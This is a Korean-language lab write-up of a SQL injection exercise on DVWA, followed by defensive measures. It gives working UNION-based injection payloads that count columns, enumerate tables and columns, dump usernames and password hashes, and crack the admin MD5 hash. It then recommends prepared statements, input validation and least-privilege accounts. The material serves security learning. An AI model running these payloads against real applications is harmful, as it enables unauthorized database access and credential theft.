# SQL Injection

- SQL Injection은 사용자 입력값이 검증 없이 SQL 쿼리에 직접 포함되어, 공격자가 쿼리 구조를 조작함으로써 데이터베이스 정보를 조회,탈취,변조할 수 있는 웹 취약점입니다.

---

## 정상 동작 확인

- 다음은 DVWA의 SQL Injection 실습 화면입니다.
- User ID 검색란에 `1`을 입력했을 때의 결과입니다.

![01](/Low/SQL%20Injection/imgs/01.png)

- ID가 `1`이며 First name과 Surname이 모두 `admin`인 컬럼이 출력됩니다.

- 다음은 `2`를 입력했을 때의 결과입니다.

![02](/Low/SQL%20Injection/imgs/02.png)

- 이를 통해 **User ID 입력값이 SQL 쿼리에 그대로 사용되고 있음**을 확인할 수 있습니다.

---

## 사용자 입력 조작 확인

- 이제 논리 연산자인 `AND`와 문자열 종료 문자 `'`를 함께 입력해봅니다.
- 다음과 같은 값을 제출합니다.
```text
1' and 1=1#
```
- `1=1`은 항상 참(TRUE)이므로 조건식이 참이 되도록 조작한 것입니다.
- 그 결과, ID가 `1`인 컬럼의 정보가 출력됩니다.

![03](/Low/SQL%20Injection/imgs/03.png)

- 이를 통해 **사용자의 입력값 `'`, `#` 등이 전혀 필터링되지 않고 있음**을 알 수 있습니다.

---

## SQL 쿼리 구조 분석

- 해당 페이지에서 사용 중인 SQL 쿼리는 다음과 같습니다.
```text
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```
- `id` 값은 사용자로부터 입력을 받습니다.
- 필자가 `1' and 1=1#`을 입력했을 때, 실제로 실행되는 쿼리는 다음과 같이 변형됩니다.
```text
SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1# ';
```
- `user_id = '1'` -> 참  
- `1=1` -> 항상 참  

- 조건 전체가 참이 되어 해당 컬럼의 정보가 사용자 화면에 출력됩니다.

---

## SELECT 컬럼 개수 확인

- UNION 공격을 수행하기 위해 먼저 SELECT 결과의 컬럼 개수를 확인합니다.
```text
1' order by 1#
```
- 첫 번째 컬럼 기준 정렬은 정상적으로 출력됩니다.

![04](/Low/SQL%20Injection/imgs/04.png)

- 다음으로 두 번째 컬럼 기준 정렬을 시도합니다.
```text
1' order by 2#
```
- 이 역시 정상적으로 출력됩니다.

![11](/Low/SQL%20Injection/imgs/11.png)

- 세 번째 컬럼 기준 정렬을 시도합니다.
```text
1' order by 3#
```
![12](/Low/SQL%20Injection/imgs/12.png)
![13](/Low/SQL%20Injection/imgs/13.png)

- 오류가 발생한 것을 통해 **SELECT 결과의 컬럼 개수는 2개**임을 확인할 수 있습니다.

---

## UNION SELECT를 이용한 데이터 출력

- 컬럼 개수가 2개이므로 UNION SELECT를 사용할 수 있습니다.
```text
1' union select 1,2#
```
- 기존 쿼리 결과 뒤에 공격자가 지정한 값이 함께 출력됩니다.

![05](/Low/SQL%20Injection/imgs/05.png)

- 출력 결과는 다음과 같습니다.
  - 기존 쿼리 결과  
    - First name: admin  
    - Surname: admin  
  - UNION으로 삽입한 결과  
    - First name: 1  
    - Surname: 2  

- 이를 통해 **UNION 기반 SQL Injection이 가능함**을 확인할 수 있습니다.

---

## 데이터베이스 정보 추출

- 현재 사용 중인 데이터베이스 이름과 접속 계정을 확인합니다.
```text
1' union select database(), user()#
```
![06](/Low/SQL%20Injection/imgs/06.png)

- 다음과 같은 정보를 획득할 수 있습니다.
  - Database 이름: `dvwa`
  - DB 접속 계정: `admin@localhost` 

---

## 테이블 목록 조회

- dvwa 데이터베이스에 존재하는 테이블 목록을 조회합니다.
```text
1' union select table_name, 2 from information_schema.tables where table_schema='dvwa'#
```
![07](/Low/SQL%20Injection/imgs/07.png)

- 확인된 테이블은 다음과 같습니다.
  - security_log  
  - guestbook  
  - users  
  - access_log  

- 계정 정보는 `users` 테이블에 존재할 가능성이 높습니다.

---

## 컬럼 목록 조회

- `users` 테이블에 존재하는 컬럼 목록을 조회합니다.
```text
1' union select column_name, 2 from information_schema.columns where table_name='users'#
```
![08](/Low/SQL%20Injection/imgs/08.png)

- 여러 컬럼 중 비밀번호 정보가 저장된 `password` 컬럼을 확인합니다.

---

## 사용자 계정 정보 탈취

- `users` 테이블에서 사용자 계정과 비밀번호 해시 값을 조회합니다.
```text
1' union select user, password from users#
```
![09](/Low/SQL%20Injection/imgs/09.png)

- `admin` 계정과 함께 비밀번호 해시 값이 출력됩니다.

---

## 해시 알고리즘 식별 및 크랙

- 획득한 해시 값을 `hash-identifier`로 분석합니다.

![14](/Low/SQL%20Injection/imgs/14.png)

- 해당 문자열은 **MD5 해시 알고리즘**이 적용된 값임을 확인할 수 있습니다.

- MD5 크랙이 가능한 사이트를 이용해 복호화합니다.

![10](/Low/SQL%20Injection/imgs/10.png)

---

## 최종 결과

- 계정: `admin`
- 비밀번호: `test`  

- 이를 통해 `SQL Injection`을 이용하여 **데이터베이스 구조 파악 -> 테이블·컬럼 열거 -> 계정 정보 탈취**가 가능함을 확인하였습니다.

---

# 대응방안

- SQL Injection의 핵심 원인은 **SQL 구조와 사용자 입력값이 문자열 결합 방식으로 합쳐지는 것**입니다.

---

### 1. Prepared Statement 사용 (중요)

- SQL 구조와 사용자 입력값을 완전히 분리합니다.
- 값은 바인딩 방식으로 전달하여 쿼리 구조를 변경할 수 없도록 합니다.
- 실무에서 가장 표준적이고 강력한 대응 방식입니다.

---

### 2. 입력값 화이트리스트 검증

- 숫자만 필요한 곳은 숫자만 허용
- 길이 제한, 형식 제한 적용
- `'`, `"`, `--`, `#`, `/* */` 등 SQL 문법 요소 차단

- 입력값이 예상 범위를 벗어나면 쿼리 실행 자체를 거부합니다.

---

### 3. DB 계정 권한 최소화

- 웹 애플리케이션 전용 DB 계정 생성
- SELECT만 필요하면 SELECT만 부여
- DROP, ALTER, FILE 권한 제거
- admin/root 계정 직접 사용 금지

---

### 4. 에러 메시지 노출 금지

- SQL 에러를 사용자 화면에 그대로 출력하지 않기
- 내부 쿼리 구조 노출 방지
- 서버 로그에만 기록
